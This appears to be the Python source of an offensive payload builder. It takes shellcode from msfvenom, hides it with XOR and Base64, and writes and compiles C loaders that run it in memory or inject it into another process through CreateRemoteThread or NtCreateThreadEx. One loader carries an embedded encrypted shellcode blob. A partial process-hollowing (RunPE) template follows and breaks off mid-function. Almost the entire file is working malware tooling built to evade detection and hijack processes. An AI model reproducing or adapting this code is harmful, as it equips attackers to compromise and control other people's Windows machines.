import sys
import subprocess
import os
import base64
import colorama
from colorama import Fore, Style

def msfvenom_payload():
    # Generate the payload and capture its output
    payload = input("serum> Set msfvenom payload: ")

    print(f"{Fore.CYAN}[*]{Fore.RESET} Generating shellcode...")
    result = subprocess.run(
        payload,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    # Check for errors during payload generation
    if result.returncode != 0:
        print(f"{Fore.RED}[-]{Fore.RESET} Error generating payload: {result.stderr}")
        return None
    
    # Extract the payload from the result
    payload = result.stdout.strip()
    
    # Remove 'unsigned char buf[] =' line if present
    payload_lines = payload.splitlines()
    cleaned_payload = ''.join(line.strip() for line in payload_lines if not line.startswith('unsigned char'))
    
    # Remove the last semicolon
    if cleaned_payload.endswith(';'):
        cleaned_payload = cleaned_payload[:-1]
    
    # Remove extra `""` and format as a byte literal
    cleaned_payload = cleaned_payload.replace('"', '').replace('\n', '')
    
    try:
        # Convert the payload into raw bytes for encryption
        raw_payload = bytes.fromhex(cleaned_payload.replace("\\x", ""))
        
        return raw_payload  # Return the raw shellcode as bytes
    except ValueError as e:
        print(f"{Fore.RED}[-]{Fore.RESET} Error processing shellcode: {e}")
        return None

def payload_encrypt():
    # Generate the raw shellcode payload
    shellcode = msfvenom_payload()
    if shellcode is None:
        print("[-] Failed to generate payload.")
        return None

    # XOR key
    key = 0xAA

    # Encrypt the shellcode using XOR with varying key
    encrypted_shellcode = bytearray((b ^ (key + i) & 0xFF) for i, b in enumerate(shellcode))
    
    print(f"\n{Fore.CYAN}[*]{Fore.RESET} Encrypting Shellcode in XOR ")

    # Encode with Base64 for additional obfuscation
    base64_encoded_shellcode = base64.b64encode(encrypted_shellcode).decode()
    
    print(f"\n{Fore.CYAN}[*]{Fore.RESET} Encrypting Shellcode in Base64 ")

    return base64_encoded_shellcode

def code_gen(option):
    base64_payload = payload_encrypt()
    

    if option == "Thread Creation":
        call = input("serum> Enter function type: ")
        if call == "WinApi":
            memory_injector = f"""
        #include <windows.h>
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
        #include <wincrypt.h>

        #pragma comment (lib, "crypt32.lib")

        unsigned char* base64_decode(const char* data, size_t* output_length) {{
            DWORD decode_length = 0;
            if (!CryptStringToBinaryA(data, 0, CRYPT_STRING_BASE64, NULL, &decode_length, NULL, NULL)) {{
                return NULL;
            }}
            unsigned char* decoded_data = (unsigned char*)malloc(decode_length);
            if (!CryptStringToBinaryA(data, 0, CRYPT_STRING_BASE64, decoded_data, &decode_length, NULL, NULL)) {{
                free(decoded_data);
                return NULL;
            }}
            *output_length = decode_length;
            return decoded_data;
        }}

        void decrypt_shellcode(unsigned char* shellcode, size_t size, char key) {{
            for (size_t i = 0; i < size; i++) {{
                shellcode[i] ^= (key + i) & 0xFF;
            }}
        }}

        int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {{
            const char* base64_encoded_shellcode =
                "{base64_payload}";
            size_t encrypted_size;
            unsigned char* encrypted_shellcode = base64_decode(base64_encoded_shellcode, &encrypted_size);
            if (!encrypted_shellcode) {{
                MessageBoxA(NULL, "Failed to decode Base64", "Error", MB_OK);
                return -1;
            }}
            char key = 0xAA;
            decrypt_shellcode(encrypted_shellcode, encrypted_size, key);
            void* exec_mem = VirtualAlloc(NULL, encrypted_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!exec_mem) {{
                MessageBoxA(NULL, "Failed to allocate memory", "Error", MB_OK);
                free(encrypted_shellcode);
                return -1;
            }}
            memcpy(exec_mem, encrypted_shellcode, encrypted_size);
            free(encrypted_shellcode);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
            Sleep(1000);
            return 0;
        }}
        """
        elif call == "ntdll":
            memory_injector = f"""
            #include <windows.h>
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
        #include <winternl.h>
        #include <wincrypt.h>

        #pragma comment (lib, "crypt32.lib")

        // Define function prototypes for direct syscalls
        typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
            HANDLE ProcessHandle,
            PVOID* BaseAddress,
            ULONG_PTR ZeroBits,
            PSIZE_T RegionSize,
            ULONG AllocationType,
            ULONG Protect
        );

        typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
            OUT PHANDLE hThread,
            IN ACCESS_MASK DesiredAccess,
            IN PVOID ObjectAttributes,
            IN HANDLE ProcessHandle,
            IN PVOID lpStartAddress,
            IN PVOID lpParameter,
            IN ULONG Flags,
            IN SIZE_T StackZeroBits,
            IN SIZE_T SizeOfStackCommit,
            IN SIZE_T SizeOfStackReserve,
            OUT PVOID lpBytesBuffer
        );

        // Base64 decoding function
        unsigned char* base64_decode(const char* data, size_t* output_length) {{
            DWORD decode_length = 0;
            if (!CryptStringToBinaryA(data, 0, CRYPT_STRING_BASE64, NULL, &decode_length, NULL, NULL)) {{
                return NULL;
            }}
            unsigned char* decoded_data = (unsigned char*)malloc(decode_length);
            if (!CryptStringToBinaryA(data, 0, CRYPT_STRING_BASE64, decoded_data, &decode_length, NULL, NULL)) {{
                free(decoded_data);
                return NULL;
            }}
            *output_length = decode_length;
            return decoded_data;
        }}

        // XOR decryption function
        void decrypt_shellcode(unsigned char* shellcode, size_t size, char key) {{
            for (size_t i = 0; i < size; i++) {{
                shellcode[i] ^= (key + i) & 0xFF;
            }}
        }}

        int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {{
            // Encrypted Base64-encoded shellcode (Replace with your real payload)
            const char* base64_encoded_shellcode =
                "VuMvSV5HcLGys/Xk9+fq6OzzjW/b90uTootPl96PQ5vqg0e/noffZpiZmeQfn+kZdue9odzzwKAjKumk5yYKBLiqvaVlvdB6sM+89CZ8eHH6+/y1ez90ZkoC1FWNTxBNgUssRA/f80da7N1UnSOQURvNUSzXVxHhjmLl7CtmKegSy1ncYix8FTp2DeRD72B9sXsYdD/vJgDJTwwBzQdUAEubDcZKxxhQghIMFA4JAQMbAx0EHwUo4o5DJTeZhzAoMzEk5nyGJ46NjCk8yAALSyVITn1+PtbIC2XMBGoniYmKwgVoxzOSkYPPVD3oEtnN0xJ40Rdu4Rvu1IKiWXLkIEDDrayur+nwCJo03rZIbenq9o10844AiT0DjEwEjzcJgkINjHQl3w4yLAGdXxCyyZuDkFQ8l2kYo1l9QJKGFzyiaiit7O/wuEqQmZH29/j5+rqsvK63ieNVVFNIN8diBFNKXO/yaddVNkcVFF6aXD0C3Rx1VpbGd3JidGR2Znhg1ettfWfQ+Hy78ni893aCQPYEusLrd3GTCryOzkgG8kHNViyym/Sg5PAFFe/wwuXEpY4U3pp3XGceaeSehhJt0i14HgIEbykw+6mLoA==";

            size_t encrypted_size;
            unsigned char* encrypted_shellcode = base64_decode(base64_encoded_shellcode, &encrypted_size);
            if (!encrypted_shellcode) {{
                MessageBoxA(NULL, "Failed to decode Base64", "Error", MB_OK);
                return -1;
            }}

            // XOR Key for decryption
            char key = 0xAA;

            // Decrypt shellcode in memory
            decrypt_shellcode(encrypted_shellcode, encrypted_size, key);

            // Load NTDLL dynamically
            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
            if (!hNtdll) {{
                MessageBoxA(NULL, "Failed to load ntdll.dll", "Error", MB_OK);
                free(encrypted_shellcode);
                return -1;
            }}

            pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
            pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

            if (!NtAllocateVirtualMemory || !NtCreateThreadEx) {{
                MessageBoxA(NULL, "Failed to resolve syscalls", "Error", MB_OK);
                free(encrypted_shellcode);
                return -1;
            }}

            // Allocate memory using NtAllocateVirtualMemory (syscall)
            PVOID exec_mem = NULL;
            SIZE_T shellcode_size = encrypted_size;
            NTSTATUS status = NtAllocateVirtualMemory(
                GetCurrentProcess(), // Allocate in the current process
                &exec_mem, 
                0, 
                &shellcode_size, 
                MEM_COMMIT | MEM_RESERVE, 
                PAGE_EXECUTE_READWRITE
            );

            if (status != 0) {{
                MessageBoxA(NULL, "NtAllocateVirtualMemory failed", "Error", MB_OK);
                free(encrypted_shellcode);
                return -1;
            }}

            // Copy the decrypted shellcode to the allocated memory
            memcpy(exec_mem, encrypted_shellcode, encrypted_size);
            free(encrypted_shellcode);  // Free the encrypted shellcode buffer

            // Create a thread using NtCreateThreadEx (syscall)
            HANDLE hThread = NULL;
            status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), exec_mem, NULL, FALSE, 0, 0, 0, NULL);

            if (status != 0) {{
                MessageBoxA(NULL, "NtCreateThreadEx failed", "Error", MB_OK);
                return -1;
            }}

            // Wait for the thread to execute the shellcode
            WaitForSingleObject(hThread, INFINITE);

            CloseHandle(hThread);

            return 0;
        }}

            """
    elif option == "Process injection":
        PID = int(input("Enter PID: "))
        call = input("Enter function type: ")
        if call == "WinApi":
            memory_injector = f"""
            #include <windows.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <wincrypt.h>

    #pragma comment (lib, "crypt32.lib")

    // Base64 Decoding Function
    unsigned char* base64_decode(const char* data, size_t* output_length) {{
        DWORD decode_length = 0;
        if (!CryptStringToBinaryA(data, 0, CRYPT_STRING_BASE64, NULL, &decode_length, NULL, NULL)) {{
            return NULL;
        }}
        unsigned char* decoded_data = (unsigned char*)malloc(decode_length);
        if (!CryptStringToBinaryA(data, 0, CRYPT_STRING_BASE64, decoded_data, &decode_length, NULL, NULL)) {{
            free(decoded_data);
            return NULL;
        }}
        *output_length = decode_length;
        return decoded_data;
    }}

    // XOR Decryption Function (Same as your provided method)
    void decrypt_shellcode(unsigned char* shellcode, size_t size, char key) {{
        for (size_t i = 0; i < size; i++) {{
            shellcode[i] ^= (key + i) & 0xFF;
        }}
    }}

    int main() {{
        // Encrypted Base64-encoded shellcode (Replace with your encrypted payload)
        const char* base64_encoded_shellcode =
            "{base64_payload}";

        size_t encrypted_size;
        unsigned char* encrypted_shellcode = base64_decode(base64_encoded_shellcode, &encrypted_size);
        if (!encrypted_shellcode) {{
            MessageBoxA(NULL, "Failed to decode Base64", "Error", MB_OK);
            return -1;
        }}

        // XOR Key used for encryption/decryption
        char key = 0xAA;

        // Decrypt the shellcode in memory
        decrypt_shellcode(encrypted_shellcode, encrypted_size, key);

        // Process Injection
        HANDLE hProcess;  // Handle to the target process
        HANDLE hThread;
        void* exec_mem;

        // Open target process (Change PID accordingly)
        DWORD pid = {PID};  // Replace with the actual PID of the target process
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
        if (!hProcess) {{
            MessageBoxA(NULL, "Failed to open target process", "Error", MB_OK);
            free(encrypted_shellcode);
            return -1;
        }}

        // Allocate memory in the target process
        exec_mem = VirtualAllocEx(hProcess, NULL, encrypted_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!exec_mem) {{
            MessageBoxA(NULL, "Failed to allocate memory in target process", "Error", MB_OK);
            free(encrypted_shellcode);
            CloseHandle(hProcess);
            return -1;
        }}

        // Write decrypted shellcode to allocated memory
        if (!WriteProcessMemory(hProcess, exec_mem, encrypted_shellcode, encrypted_size, NULL)) {{
            MessageBoxA(NULL, "Failed to write shellcode", "Error", MB_OK);
            free(encrypted_shellcode);
            VirtualFreeEx(hProcess, exec_mem, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return -1;
        }}

        // Create remote thread in target process to execute shellcode
        hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
        if (!hThread) {{
            MessageBoxA(NULL, "Failed to create remote thread", "Error", MB_OK);
            free(encrypted_shellcode);
            VirtualFreeEx(hProcess, exec_mem, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return -1;
        }}

        // Cleanup
        free(encrypted_shellcode);
        CloseHandle(hThread);
        CloseHandle(hProcess);

        return 0;
    }}
            """
        elif call == "ntdll":
            memory_injector = f"""
            #include <windows.h>
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
        #include <winternl.h>
        #include <wincrypt.h>

        #pragma comment (lib, "crypt32.lib")

        // Define the function prototype for NtCreateThreadEx
        typedef NTSTATUS(WINAPI* pNtCreateThreadEx)(
            OUT PHANDLE hThread,
            IN ACCESS_MASK DesiredAccess,
            IN PVOID ObjectAttributes,
            IN HANDLE ProcessHandle,
            IN PVOID lpStartAddress,
            IN PVOID lpParameter,
            IN ULONG Flags,
            IN SIZE_T StackZeroBits,
            IN SIZE_T SizeOfStackCommit,
            IN SIZE_T SizeOfStackReserve,
            OUT PVOID lpBytesBuffer
            );

        // Base64 decoding function
        unsigned char* base64_decode(const char* data, size_t* output_length) {{
            DWORD decode_length = 0;
            if (!CryptStringToBinaryA(data, 0, CRYPT_STRING_BASE64, NULL, &decode_length, NULL, NULL)) {{
                return NULL;
            }}
            unsigned char* decoded_data = (unsigned char*)malloc(decode_length);
            if (!CryptStringToBinaryA(data, 0, CRYPT_STRING_BASE64, decoded_data, &decode_length, NULL, NULL)) {{
                free(decoded_data);
                return NULL;
            }}
            *output_length = decode_length;
            return decoded_data;
        }}

        // XOR decryption function
        void decrypt_shellcode(unsigned char* shellcode, size_t size, char key) {{
            for (size_t i = 0; i < size; i++) {{
                shellcode[i] ^= (key + i) & 0xFF;
            }}
        }}

        int main() {{
            // Encrypted Base64-encoded shellcode (replace with your payload)
            const char* base64_encoded_shellcode =
                "{base64_payload}";

            size_t encrypted_size;
            unsigned char* encrypted_shellcode = base64_decode(base64_encoded_shellcode, &encrypted_size);
            if (!encrypted_shellcode) {{
                MessageBoxA(NULL, "Failed to decode Base64", "Error", MB_OK);
                return -1;
            }}

            // XOR Key for decryption
            char key = 0xAA;

            // Decrypt shellcode in memory
            decrypt_shellcode(encrypted_shellcode, encrypted_size, key);

            // Open target process (Change PID accordingly)
            DWORD pid = {PID};  // Replace with actual target process PID
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            if (!hProcess) {{
                MessageBoxA(NULL, "Failed to open target process", "Error", MB_OK);
                free(encrypted_shellcode);
                return -1;
            }}

            // Allocate memory in the target process
            void* exec_mem = VirtualAllocEx(hProcess, NULL, encrypted_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!exec_mem) {{
                MessageBoxA(NULL, "Failed to allocate memory in target process", "Error", MB_OK);
                free(encrypted_shellcode);
                CloseHandle(hProcess);
                return -1;
            }}

            // Write decrypted shellcode to allocated memory
            if (!WriteProcessMemory(hProcess, exec_mem, encrypted_shellcode, encrypted_size, NULL)) {{
                MessageBoxA(NULL, "Failed to write shellcode", "Error", MB_OK);
                free(encrypted_shellcode);
                VirtualFreeEx(hProcess, exec_mem, 0, MEM_RELEASE);
                CloseHandle(hProcess);
                return -1;
            }}

            // Load NtCreateThreadEx dynamically from ntdll.dll
            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
            if (!hNtdll) {{
                MessageBoxA(NULL, "Failed to load ntdll.dll", "Error", MB_OK);
                return -1;
            }}

            pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
            if (!NtCreateThreadEx) {{
                MessageBoxA(NULL, "Failed to find NtCreateThreadEx", "Error", MB_OK);
                return -1;
            }}

            // Create thread using NtCreateThreadEx
            HANDLE hThread = NULL;
            NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)exec_mem, NULL, FALSE, 0, 0, 0, NULL);
            if (!NT_SUCCESS(status)) {{
                MessageBoxA(NULL, "Failed to create remote thread", "Error", MB_OK);
                free(encrypted_shellcode);
                VirtualFreeEx(hProcess, exec_mem, 0, MEM_RELEASE);
                CloseHandle(hProcess);
                return -1;
            }}

            // Cleanup
            free(encrypted_shellcode);
            CloseHandle(hThread);
            CloseHandle(hProcess);

            return 0;
        }}
            """

    with open('payload.c', 'w') as file:
        file.write(memory_injector)
    
    print(f"{Fore.GREEN}[+]{Fore.RESET} Injector code has been generated succesfully")

    os.system("x86_64-w64-mingw32-gcc -o injector.exe payload.c -mwindows -lcrypt32")

    print(f"{Fore.GREEN}[+]{Fore.RESET} Injector code has been compiled succesfully")

def code_gen2(exe, process):
    memory_injector_part1 = f"""#include <cstdio>
    #include <winternl.h>
    #include <windows.h>

    LPSTR lpSourceImage;
    LPSTR lpTargetProcess;

    // Structure to store the address process infromation.
    struct ProcessAddressInformation
    {{
        LPVOID lpProcessPEBAddress;
        LPVOID lpProcessImageBaseAddress;
    }};

    typedef struct IMAGE_RELOCATION_ENTRY {{
        WORD Offset : 12;
        WORD Type : 4;
    }} IMAGE_RELOCATION_ENTRY, * PIMAGE_RELOCATION_ENTRY;

    HANDLE GetFileContent(const LPSTR lpFilePath)
    {{
        const HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        const DWORD dFileSize = GetFileSize(hFile, nullptr);
        const HANDLE hFileContent = HeapAlloc(GetProcessHeap(), 0, dFileSize);
        const BOOL bFileRead = ReadFile(hFile, hFileContent, dFileSize, nullptr, nullptr);

        CloseHandle(hFile);
        return hFileContent;
    }}

    BOOL IsValidPE(const LPVOID lpImage)
    {{
        const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
        const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
        if (lpImageNTHeader->Signature == IMAGE_NT_SIGNATURE)
            return TRUE;

        return FALSE;
    }}

    BOOL IsPE32(const LPVOID lpImage)
    {{
        const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
        const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
        if (lpImageNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
            return TRUE;

        return FALSE;
    }}

    ProcessAddressInformation GetProcessAddressInformation32(const PPROCESS_INFORMATION lpPI)
    {{
        LPVOID lpImageBaseAddress = nullptr;
        WOW64_CONTEXT CTX = {{}};
        CTX.ContextFlags = CONTEXT_FULL;
        Wow64GetThreadContext(lpPI->hThread, &CTX);
        const BOOL bReadBaseAddress = ReadProcessMemory(lpPI->hProcess, (LPVOID)(uintptr_t)(CTX.Ebx + 0x8), &lpImageBaseAddress, sizeof(DWORD), nullptr);
        if (!bReadBaseAddress)
            return ProcessAddressInformation{{ nullptr, nullptr }};

        return ProcessAddressInformation{{ (LPVOID)(uintptr_t)CTX.Ebx, lpImageBaseAddress }};
    }}

    ProcessAddressInformation GetProcessAddressInformation64(const PPROCESS_INFORMATION lpPI)
    {{
        LPVOID lpImageBaseAddress = nullptr;
        CONTEXT CTX = {{}};
        CTX.ContextFlags = CONTEXT_FULL;
        GetThreadContext(lpPI->hThread, &CTX);
        const BOOL bReadBaseAddress = ReadProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageBaseAddress, sizeof(UINT64), nullptr);
        if (!bReadBaseAddress)
            return ProcessAddressInformation{{ nullptr, nullptr }};

        return ProcessAddressInformation{{ (LPVOID)CTX.Rdx, lpImageBaseAddress }};
    }}

    DWORD GetSubsytem32(const LPVOID lpImage)
    {{
        const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
        const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
        return lpImageNTHeader->OptionalHeader.Subsystem;
    }}

    DWORD GetSubsytem64(const LPVOID lpImage)
    {{
        const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
        const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
        return lpImageNTHeader->OptionalHeader.Subsystem;
    }}

    DWORD GetSubsystemEx32(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
    {{
        constexpr IMAGE_DOS_HEADER ImageDOSHeader = {{}};
        const BOOL bGetDOSHeader = ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImageDOSHeader, sizeof(IMAGE_DOS_HEADER), nullptr);

        constexpr IMAGE_NT_HEADERS32 ImageNTHeader = {{}};
        const BOOL bGetNTHeader = ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)lpImageBaseAddress + ImageDOSHeader.e_lfanew), (LPVOID)&ImageNTHeader, sizeof(IMAGE_NT_HEADERS32), nullptr);


        return ImageNTHeader.OptionalHeader.Subsystem;
    }}

    DWORD GetSubsystemEx64(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
    {{
        constexpr IMAGE_DOS_HEADER ImageDOSHeader = {{}};
        const BOOL bGetDOSHeader = ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImageDOSHeader, sizeof(IMAGE_DOS_HEADER), nullptr);

        constexpr IMAGE_NT_HEADERS64 ImageNTHeader = {{}};
        const BOOL bGetNTHeader = ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)lpImageBaseAddress + ImageDOSHeader.e_lfanew), (LPVOID)&ImageNTHeader, sizeof(IMAGE_NT_HEADERS64), nullptr);

        return ImageNTHeader.OptionalHeader.Subsystem;
    }}

    void CleanAndExitProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hFileContent)
    {{
        if (hFileContent != nullptr && hFileContent != INVALID_HANDLE_VALUE)
            HeapFree(GetProcessHeap(), 0, hFileContent);

        if (lpPI->hThread != nullptr)
            CloseHandle(lpPI->hThread);

        if (lpPI->hProcess != nullptr)
        {{
            TerminateProcess(lpPI->hProcess, -1);
            CloseHandle(lpPI->hProcess);
        }}
    }}
    void CleanProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hFileContent)
    {{
        if (hFileContent != nullptr && hFileContent != INVALID_HANDLE_VALUE)
            HeapFree(GetProcessHeap(), 0, hFileContent);

        if (lpPI->hThread != nullptr)
            CloseHandle(lpPI->hThread);

        if (lpPI->hProcess != nullptr)
            CloseHandle(lpPI->hProcess);
    }}
    BOOL HasRelocation32(const LPVOID lpImage)
    {{
        const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
        const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
        if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
            return TRUE;

        return FALSE;
    }}
    BOOL HasRelocation64(const LPVOID lpImage)
    {{
        const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
        const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
        if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
            return TRUE;

        return FALSE;
    }}

    IMAGE_DATA_DIRECTORY GetRelocAddress32(const LPVOID lpImage)
    {{
        const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
        const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
        if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
            return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        return {{ 0, 0 }};
    }}

    IMAGE_DATA_DIRECTORY GetRelocAddress64(const LPVOID lpImage)
    {{
        const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
        const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
        if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
            return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        return {{ 0, 0 }};
    }}

    BOOL RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
    {{
        LPVOID lpAllocAddress;

        const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
        const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

        lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (LPVOID)(uintptr_t)lpImageNTHeader32->OptionalHeader.ImageBase, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


        const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, (LPVOID)lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);

        for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
        {{
            const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
            const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);

        }}
"""

    memory_injector_part2 = f"""
        WOW64_CONTEXT CTX = {{}};
        CTX.ContextFlags = CONTEXT_FULL;

        const BOOL bGetContext = Wow64GetThreadContext(lpPI->hThread, &CTX);

        const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpImageNTHeader32->OptionalHeader.ImageBase, sizeof(DWORD), nullptr);

        CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

        const BOOL bSetContext = Wow64SetThreadContext(lpPI->hThread, &CTX);

        ResumeThread(lpPI->hThread);

        return TRUE;
    }}

    BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
    {{
        LPVOID lpAllocAddress;

        const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
        const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

        lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);


        for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
        {{
            const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
            const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);

        }}

        CONTEXT CTX = {{}};
        CTX.ContextFlags = CONTEXT_FULL;

        const BOOL bGetContext = GetThreadContext(lpPI->hThread, &CTX);


        const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);


        CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

        const BOOL bSetContext = SetThreadContext(lpPI->hThread, &CTX);


        ResumeThread(lpPI->hThread);

        return TRUE;
    }}

    BOOL RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
    {{
        LPVOID lpAllocAddress;

        const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
        const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

        lpAllocAddress = VirtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


        const DWORD DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader32->OptionalHeader.ImageBase;

        lpImageNTHeader32->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;
        const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);


        const IMAGE_DATA_DIRECTORY ImageDataReloc = GetRelocAddress32(lpImage);
        PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

